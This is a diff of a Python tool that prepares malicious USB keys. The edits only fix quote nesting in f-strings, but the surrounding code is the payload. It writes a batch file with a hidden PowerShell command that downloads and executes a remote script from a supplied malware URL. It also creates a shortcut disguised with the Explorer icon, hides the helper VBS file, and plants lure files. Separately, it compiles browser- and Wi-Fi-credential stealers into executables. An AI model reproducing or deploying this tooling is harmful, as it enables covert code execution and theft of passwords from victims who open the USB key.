@@ -70,7 +70,7 @@ def validate_usb_path(path):
         return True
 def configure_usb(tool_id, usb_path, exe_name, malware_url=''):
     tool = tools[tool_id]
-    tool_dir = f'{usb_path}\\{tool['leurre_dir']}'
+    tool_dir = f'{usb_path}\\{tool["leurre_dir"]}'
     try:
         os.makedirs(tool_dir, exist_ok=True)
     except PermissionError:
@@ -91,7 +91,7 @@ def configure_usb(tool_id, usb_path, exe_name, malware_url=''):
             else:
                 print_cyan(f'[-] ERROR: Executable {exe_path} not found!')
                 return False
-    bat_file = f'{tool['name'].lower().replace(' ', '_')}.bat'
+    bat_file = f'{tool["name"].lower().replace(" ", "_")}.bat'
     bat_content = tool['bat_content'].replace('{EXE_NAME}', exe_name if exe_name else 'none')
     malware_line = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\'{malware_url}\')\"' if malware_url else ''
     bat_content = bat_content.replace('{MALWARE}', malware_line)
@@ -103,23 +103,23 @@ def configure_usb(tool_id, usb_path, exe_name, malware_url=''):
         print_cyan(f'[-] ERROR: Permission denied writing {bat_file}. Run as admin.')
         return False
     if tool['lnk_name']:
-        lnk_content = f'Set WShell = CreateObject(\"WScript.Shell\")\nSet Lnk = WShell.CreateShortcut(\"{usb_path}\\{tool['lnk_name']}\")\nLnk.TargetPath = \"{tool_dir}\\{bat_file}\"\nLnk.IconLocation = \"%SystemRoot%\\explorer.exe,0\"\nLnk.Save'
+        lnk_content = f'Set WShell = CreateObject("WScript.Shell")\nSet Lnk = WShell.CreateShortcut("{usb_path}\\{tool["lnk_name"]}")\nLnk.TargetPath = "{tool_dir}\\{bat_file}"\nLnk.IconLocation = "%SystemRoot%\\explorer.exe,0"\nLnk.Save'
         try:
             with open(f'{tool_dir}\\lnk.vbs', 'w', encoding='utf-8') as f:
                 f.write(lnk_content)
             os.system(f'cscript \"{tool_dir}\\lnk.vbs\" >nul 2>&1 && attrib +h \"{tool_dir}\\lnk.vbs\" >nul 2>&1')
         except:
-            print_cyan(f'[-] ERROR: Failed to create shortcut for {tool['name']}.')
+            print_cyan(f'[-] ERROR: Failed to create shortcut for {tool["name"]}.')
             return False
     if tool['leurre_dir']:
         try:
             os.makedirs(f'{tool_dir}', exist_ok=True)
-            with open(f'{tool_dir}\\{tool['leurre_file']}', 'w', encoding='utf-8') as f:
+            with open(f'{tool_dir}\\{tool["leurre_file"]}', 'w', encoding='utf-8') as f:
                 f.write(tool['leurre_content'])
         except PermissionError:
             print_cyan('[-] ERROR: Permission denied creating lure directory. Run as admin.')
             return False
-    print_cyan(f'[*] USB configured with {tool['name']} at {tool_dir}')
+    print_cyan(f'[*] USB configured with {tool["name"]} at {tool_dir}')
     return True
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -187,7 +187,7 @@ def main():
         if malware_choice in (1, 2):
             stealer_code = browser_stealer_code if malware_choice == 1 else wifi_stealer_code
             exe_name = 'browser_stealer.exe' if malware_choice == 1 else 'wifi_stealer.exe'
-            temp_script_path = os.path.join(os.getcwd(), f'{('browser' if malware_choice == 1 else 'wifi')}_stealer_temp.py')
+            temp_script_path = os.path.join(os.getcwd(), f'{"browser" if malware_choice == 1 else "wifi"}_stealer_temp.py')
             loading_bar('Checking PyInstaller', duration=1)
             result = subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             if result.returncode!= 0:
@@ -225,7 +225,7 @@ def main():
             except Exception as e:
                 print_cyan(f'[-] ERROR: Failed to read {temp_script_path}: {str(e)}')
                 sys.exit(1)
-            loading_bar(f'Compiling {('Browser' if malware_choice == 1 else 'Wi-Fi')} Stealer to .exe', duration=3)
+            loading_bar(f'Compiling {"Browser" if malware_choice == 1 else "Wi-Fi"} Stealer to .exe', duration=3)
             command = ['pyinstaller', '--onefile', '--windowed', temp_script_path]
             result = subprocess.run(command, capture_output=True, text=True)
             if result.returncode!= 0:
@@ -270,7 +270,7 @@ def main():
                 sys.exit(1)
     loading_bar('Configuring USB key', duration=2)
     if configure_usb(tool_choice, usb_path, exe_name, malware_url):
-        print_cyan(f'[+] USB ready with {tools[tool_choice]['name']}' + (f' and {['Browser Stealer', 'Wi-Fi Stealer', 'Custom Malware'][malware_choice - 1]}' if tool_choice!= 2 else ''))
+        print_cyan(f'[+] USB ready with {tools[tool_choice]["name"]}' + (f' and {["Browser Stealer", "Wi-Fi Stealer", "Custom Malware"][malware_choice - 1]}' if tool_choice != 2 else ''))
     else:
         print_cyan('[!] USB configuration failed. Run as admin.')
     loading_bar('Operation Complete', duration=1)
